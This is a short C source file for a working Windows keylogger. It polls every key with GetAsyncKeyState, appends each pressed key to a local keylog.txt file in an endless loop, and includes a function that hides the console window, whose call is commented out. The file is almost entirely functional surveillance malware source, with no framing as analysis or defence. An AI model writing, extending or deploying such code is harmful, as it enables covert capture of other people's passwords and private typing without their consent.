#include "keylogger.h"
#include <stdio.h>
#include <windows.h>

void initKeylogger() {
    FILE *file = fopen("keylog.txt", "a+");
    if (file == NULL) {
        handleErrors("Failed to open log file.");
    } else {
        fclose(file);
    }
}

void logKey(int key) {
    FILE *file = fopen("keylog.txt", "a+");
    if (file == NULL) {
        handleErrors("Failed to open log file.");
        return;
    }
    fprintf(file, "%c", key);
    fclose(file);
}

// captures key
int captureKey() {
    for(int key = 8; key <= 255; key++) {
        if (GetAsyncKeyState(key) & 0x8000) {
            return key;
        }
    }
    return 0;
}

// hides console window
void hideConsole() {
    HWND hwnd = GetConsoleWindow(); //gets the console window
    ShowWindow(hwnd, SW_HIDE); //SW_HIDE hides the window
}

// starts keylogger
void runKeylogger() {
    initKeylogger();
    // hideConsole();
    while (1) {
        int key = captureKey();
        if (key != 0) {
            logKey(key);
        }
        Sleep(10);
    }
}

void handleErrors(const char *errorMsg) {
    FILE* file = fopen("error_logs.txt", "a+");
    if (file != NULL) {
        fprintf(file, "Error: %s\n", errorMsg);
        fclose(file);
    }
    exit(-1);
}
